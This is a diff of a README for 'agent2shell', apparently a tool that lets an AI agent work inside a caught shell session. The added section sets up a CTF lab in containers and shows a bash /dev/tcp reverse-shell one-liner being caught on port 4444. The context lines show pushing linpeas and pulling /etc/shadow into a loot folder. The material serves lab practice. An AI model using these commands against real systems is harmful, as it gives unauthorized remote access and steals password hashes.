@@ -37,6 +37,28 @@ agent2shell push ./linpeas.sh /tmp/linpeas.sh
 agent2shell pull /etc/shadow ./loot/shadow
 ```
 
+## Try It with a Real Target
+
+[supplyline](https://github.com/0xmagic0/ctf-labs/tree/main/supplyline) is a multi-container CTF lab with a vulnerable web app. Use it as a realistic target for agent2shell:
+
+```bash
+# Clone and start the lab
+git clone https://github.com/0xmagic0/ctf-labs.git
+cd ctf-labs/supplyline
+docker compose up -d --build
+
+# Terminal 1: catch a reverse shell
+agent2shell catch -p 4444
+
+# Terminal 2: send a reverse shell from the container
+docker exec -it supplyline-web bash -c 'bash >& /dev/tcp/172.20.0.1/4444 0>&1'
+
+# Terminal 3 (or your AI agent): interact with the session
+agent2shell run whoami
+agent2shell run cat /etc/os-release
+agent2shell status
+```
+
 ## Architecture
 
 <p align="center">
